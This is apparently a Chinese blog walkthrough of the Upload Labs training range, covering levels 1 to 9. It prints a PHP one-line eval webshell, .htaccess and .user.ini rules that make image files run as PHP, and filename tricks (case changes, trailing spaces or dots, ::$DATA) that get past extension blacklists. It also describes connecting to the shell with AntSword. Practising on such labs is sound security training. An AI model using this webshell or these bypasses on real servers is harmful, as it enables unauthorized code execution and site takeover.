+++
date = '2026-04-19T13:04:50Z'
draft = false
title = 'Upload Labs通关'
categories = ["挑战记录"]
tags = ["upload-labs", "文件上传", "web靶场"]
+++

# 第1关

1.创建文件shell.php，写入以下内容：

```php
<?php

#一句话木马
@eval($_POST['cmd']);

#显示php环境信息，便于观察shell.php是否上传成功且被成功执行
phpinfo();

?>
```
2.上传shell.php文件

上传失败，.php文件无法上传。

![alt text](/images/image-7.png)

打开BurpSuite抓包，上传文件发现页面依旧弹窗提示上传失败，但是BurpSuite没有抓到包，说明对文件类型的判断是在前端进行的，数据包并没有传送到服务端。

![alt text](/images/image-1.png)

![alt text](/images/image-7.png)

3.关闭前端校验（方法一）

关闭浏览器JavaScript功能（以chrome为例）

设置-隐私设置和安全性-网站设置-javaScript-不允许网站使用JavaScript

![alt text](/images/image-2.png)

![alt text](/images/image-3.png)

![alt text](/images/image-4.png)

4.上传shell.php并访问

关闭JavaScript功能后刷新页面，上传shell.php文件。

文件上传成功后在图片区域点击鼠标右键，复制图片地址，打开新的标签页访问图片。

![alt text](/images/image-5.png)

![alt text](/images/image.png)

可以看到php的环境配置，说明shell.php文件已经上传成功并且已被执行。

5.BurpSuite抓包改后缀（方法二）

将shell.php改成shell.jpg，上传shell.jpg,BurpSuite抓包修改后缀为shell.php。

![alt text](/images/image-6.png)

放行数据包后，可以看到文件上传成功，接步骤4。

6.中国蚁剑连接

填写shell.php访问链接和连接密码。

![alt text](/images/image-8.png)

![alt text](/images/image-9.png)

# 第2关

1.分析核心源代码

```php
if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
    if (move_uploaded_file($temp_file, $img_path)) {
         $is_upload = true;
    } else {
         $msg = '上传出错！';
    }
} else {
    $msg = '文件类型不正确，请重新上传！';
}
```

由if判断条件可知，上传文件的类型必须为image/jpeg、image/png、image/gif这三种类型。

2.BurpSuite抓包

改文件类型，放行数据包，前端页面可见文件上传成功。

![alt text](/images/image-10.png)

3.蚁剑连接

常规操作不再赘述。

# 第3关

1.分析核心源代码

```php
$deny_ext = array('.asp','.aspx','.php','.jsp');
```
$deny_ext定义了黑名单，'.asp','.aspx','.php','.jsp'后缀会被过滤掉。

2.更换shell.php文件的后缀

将php文件的后缀更换成以下任一后缀，或者使用大小写绕过。

```text
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phtm
.phtml
.phar
```
3.更换后缀后上传，然后蚁剑连接

# 第4关

1.分析核心源代码

```php
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
```
这里使用黑名单过滤了所有php、jsp、asp可执行文件的后缀，通过后缀名绕过不可行。但是忽略了.htaccess后缀的文件。

>通过 .htaccess 规则，让本不执行脚本的文件（如 .jpg、.png、.txt、.gif）被服务器当成 PHP 脚本执行。

.htaccess最常用的三条解析规则

```text
# 1. 让jpg当php执行
AddType application/x-httpd-php .jpg

# 2. 让png当php执行
AddHandler application/x-httpd-php .png

# 3. 指定某个文件当php执行
<Files "shell.txt">
SetHandler application/x-httpd-php
</Files>
```

【注意】

Apache 2.2 及以前：默认 AllowOverride All → .htaccess 自动生效
Apache 2.3.9+ / 2.4.x：默认 AllowOverride None → 完全不读取 .htaccess

建议在2.2及以前版本进行漏洞复现。

重启Apache服务使配置生效。

2.创建并编辑.htaccess文件

在Linux系统中可以直接创建并编辑，在Windows系统中需要先用记事本编辑内容再另存为.htaccess文件。

在.htaccess文件中指定shell.txt文件当php执行,编辑完成后保存并上传。

```php
<Files "shell.txt">
SetHandler application/x-httpd-php
</Files>
```

3.上传shell.txt文件

修改shell.php后缀为shell.txt,然后上传，上传成功后使用中国蚁剑连接。

# 第5关

1.分析核心源代码

```text
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");

```

这里漏掉了.ini配置文件，可以上传.user.ini文件，对apache和nginx通用。（.htaccess只对apache有效）

.user.ini文件可以指定一个文件，其他php文件在执行前会在首行/末尾包含指定文件的内容。

```text
;在首行包含shell.jpg的内容
auto_prepend_file = shell.jpg

;在末尾包含shell.jpg的内容
auto_append_file = shell.jpg
```

2.创建、编辑并上传.user.ini文件

.user.ini文件内容如下：

```text
auto_prepend_file = shell.jpg
```

.user.ini文件上传成功后需要等待一段时间生效（1分钟以内）。

3.修改shell.php改为shell.jpg并上传

4.检测生效

在upload文件夹下靶场放置了一个readme.php文件，访问readme.php文件，readme.php文件则会把shell.jpg文件中的一句话木马包含进去一起执行。

![alt text](/images/image-11.png)


5.中国蚁剑连接

# 第6关

1.分析核心源代码

```php
 $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
    $file_name = trim($_FILES['upload_file']['name']);
    $file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = strrchr($file_name, '.');
    #$file_ext = strtolower($file_ext); //转换为小写
    $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
    $file_ext = trim($file_ext); //首尾去空
```

对照第4关的源代码发现，本关在后缀处理时没有将后缀转换成小写，因此可以使用大小写绕过，使大小写组成的后缀不在黑名单中。

2.将shell.php改成shell.PhP，长传。

3.上传成功后蚁剑连接。

# 第7关

1.分析核心源代码

```php
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
    #$file_name = trim($_FILES['upload_file']['name']);
    $file_name = $_FILES['upload_file']['name'];
    $file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = strrchr($file_name, '.');
    $file_ext = strtolower($file_ext); //转换为小写
    $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
    #$file_ext = trim($file_ext); //首尾去空
```
本关在处理后缀时没有删掉文件末尾的空格，可以使用BurpSuite抓包，在文件名末尾增加空格，然后上传文件，服务器会自动将空格删除掉。

2.BurpSuite抓包改后缀，在文件名后加一个空格，上传文件。

3.中国蚁剑连接

# 第8关

1.分析核心源代码

```php
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
    $file_name = trim($_FILES['upload_file']['name']);
    #$file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = strrchr($file_name, '.');
    $file_ext = strtolower($file_ext); //转换为小写
    $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
    $file_ext = trim($file_ext); //首尾去空
```
本关在处理后缀名称的时候，没有删除文件名末尾的点（.），可以使用BurpSuite抓包，在文件名末尾增加点，然后上传文件，服务器会自动将点删除掉。

2.BurpSuite抓包改后缀，在文件名后加一个点，上传文件。

3.中国蚁剑连接

# 第9题

1.分析核心源代码

```php
 $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
    $file_name = trim($_FILES['upload_file']['name']);
    $file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = strrchr($file_name, '.');
    $file_ext = strtolower($file_ext); //转换为小写
    #$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
    $file_ext = trim($file_ext); //首尾去空
```
本关在处理后缀名称的时候，没有删除文件名末尾的::$DATA，可以使用BurpSuite抓包，在文件名末尾增加::$DATA，然后上传文件，服务器会自动将::$DATA删除掉。

>::$DATA 是 Windows NTFS 文件系统 中一个特殊的备用数据流（Alternate Data Stream, ADS） 语法，每个 NTFS 文件都有一个主数据流（未命名），其完整名称为 文件名::$DATA。仅适用于 Windows + NTFS 文件系统。

2.BurpSuite抓包改后缀，在文件名后加一个::$DATA，上传文件。

3.中国蚁剑连接

中国蚁剑在填写访问路径时，要将文件末尾的::$DATA删除掉。

# 第10关


